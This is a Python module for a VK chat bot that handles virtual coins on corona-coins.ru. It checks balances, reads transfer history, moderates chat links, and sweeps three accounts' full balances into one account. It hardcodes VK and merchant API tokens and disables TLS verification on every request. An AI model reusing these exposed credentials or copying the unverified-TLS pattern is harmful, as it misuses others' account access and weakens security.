import vk_api, random, requests, json
url = 'https://corona-coins.ru/api/'
url_vk = 'https://coin-without-bugs.vkforms.ru/merchant/score/'
token = "2d2f9b047ecea70482369b11831d47fefecbd7934962699cd5fb9bc176bf31459696993a0f14078fb7945"
vk = vk_api.VkApi(token=token)

def wm(id, message, keyboard):
    vk.method('messages.send', {"keyboard": keyboard, "dont_parse_links": 1,'user_id': id, 'message': message, 'random_id': random.randint(0, 999999999)})

def wms(peer_id, message):
    vk.method('messages.send', {'peer_id': peer_id, 'message': message, 'random_id': random.randint(0, 999999999)})

def send(id, coins):
    data = {"token": "9S0rRqZJTd9JeF9tWfb5FfzOcWrp9p4t", "method": "transfer", "to_id": id, "amount": int(coins)}
    r = requests.post(url, auth=('username', 'password'), verify=False, json=data)

def balance(id):
    data = {"token": "9S0rRqZJTd9JeF9tWfb5FfzOcWrp9p4t", "method": "score", "user_ids": [591494343, id]}
    r = requests.post(url, auth=('username', 'password'), verify=False, json=data)
    bal = json.loads(r.text)
    data_vk = {"key":"f3gglglFNe8,iikAj8,-4WrQP1u7h.!ZV#D#41]6xUXERGSPws", "merchantId":591494343, "userIds": [591494343, id]}
    r_vk = requests.post(url_vk, auth=('username', 'password'), verify=False, json=data_vk)
    bal_vk = json.loads(r_vk.text)
    score =  ('{0:,}'.format(bal['response'][1]['coins']).replace(',', '.'))
    score_u = ('{0:,}'.format(bal['response'][0]['coins']).replace(',', '.'))
    score_vk = ('{0:,}'.format(bal_vk['response']['591494343']).replace(',', '.'))
    score_u_vk = ('{0:,}'.format(bal_vk['response'][str(id)]).replace(',', '.'))
    return [score, score_u, score_u_vk, score_vk]

def delete(chat_id, id):
    vk.method('messages.removeChatUser', {'chat_id': chat_id, 'user_id': id})

def uichat(peer_id):
    users = vk.method('messages.getConversationMembers', {'peer_id': peer_id})
    return users

def user(id):
    ya = vk.method("users.get", {"user_ids": id})
    return ya

def delete_msg(chat):
    messages = vk.method('messages.getHistory', {'peer_id': chat,'count': 10, })
    for i in range(0, 10):
        ans = messages['items'][i]['text']
        if "https" in ans or "http" in ans or "com" in ans or "ru" in ans:
            print(2)
            vk.method('messages.delete', {'message_ids': messages['items'][i]['id'],'delete_for_all': 1, })
            print(3)

def history():
    data_h = {"token": "9S0rRqZJTd9JeF9tWfb5FfzOcWrp9p4t", "method": "history", "type": 1}
    r = requests.post(url, auth=('username', 'password'), verify=False, json=data_h)
    bal = json.loads(r.text)
    his1 = ('{0:,}'.format(bal['response'][0]['amount']).replace(',', '.'))
    ids1 = bal['response'][0]['from_id']
    his2 = ('{0:,}'.format(bal['response'][1]['amount']).replace(',', '.'))
    ids2 = bal['response'][1]['from_id']
    his3 = ('{0:,}'.format(bal['response'][2]['amount']).replace(',', '.'))
    ids3 = bal['response'][2]['from_id']
    his4 = ('{0:,}'.format(bal['response'][3]['amount']).replace(',', '.'))
    ids4 = bal['response'][3]['from_id']
    his5 = ('{0:,}'.format(bal['response'][4]['amount']).replace(',', '.'))
    ids5 = bal['response'][4]['from_id']
    return [his1, ids1, his2, ids2, his3, ids3, his4, ids4, his5, ids5]

def garden():
    def balance():
        data = {"token": "9S0rRqZJTd9JeF9tWfb5FfzOcWrp9p4t", "method": "score", "user_ids": [564815125, 244533400, 377571282]}
        r = requests.post(url, auth=('username', 'password'), verify=False, json=data)
        bal = json.loads(r.text)
        score =  (bal['response'][0]['coins'])
        score1 =  (bal['response'][1]['coins'])
        score2 =  (bal['response'][2]['coins'])
        return score, score1, score2
    def send_olya(coins):
        data = {"token": "QXlX8oEus3riFU4m38W1F-B3VFd-kQ5Z", "method": "transfer", "to_id": 591494343, "amount": int(coins)}
        r = requests.post(url, auth=('username', 'password'), verify=False, json=data)
    def send_leha(coins):
        data = {"token": "s1kE6hcYz836Pcf4g2nnVDLVC7chZc4N", "method": "transfer", "to_id": 591494343, "amount": int(coins)}
        r = requests.post(url, auth=('username', 'password'), verify=False, json=data)
    def send_andrey(coins):
        data = {"token": "H4XTDqu6Vwo0olUlaUIuF0u1XXNbuEHK", "method": "transfer", "to_id": 591494343, "amount": int(coins)}
        r = requests.post(url, auth=('username', 'password'), verify=False, json=data)
    balance_user = balance()
    print(balance_user)
    send_olya(balance_user[2])
    send_leha(balance_user[0])
    send_andrey(balance_user[1])
    return balance_user


def garden_balance():
    data = {"token": "9S0rRqZJTd9JeF9tWfb5FfzOcWrp9p4t", "method": "score", "user_ids": [564815125, 244533400, 377571282, 591494343]}
    r = requests.post(url, auth=('username', 'password'), verify=False, json=data)
    bal = json.loads(r.text)
    score_ob = bal['response'][0]['coins'] + bal['response'][1]['coins'] + bal['response'][2]['coins'] + bal['response'][3]['coins']
    score_ob = ('{0:,}'.format(score_ob).replace(',', '.'))
    score =  ('{0:,}'.format(bal['response'][0]['coins']).replace(',', '.'))
    score1 =  ('{0:,}'.format(bal['response'][1]['coins']).replace(',', '.'))
    score2 =  ('{0:,}'.format(bal['response'][2]['coins']).replace(',', '.'))
    score3 =  ('{0:,}'.format(bal['response'][3]['coins']).replace(',', '.'))
    return score, score1, score2, score3, score_ob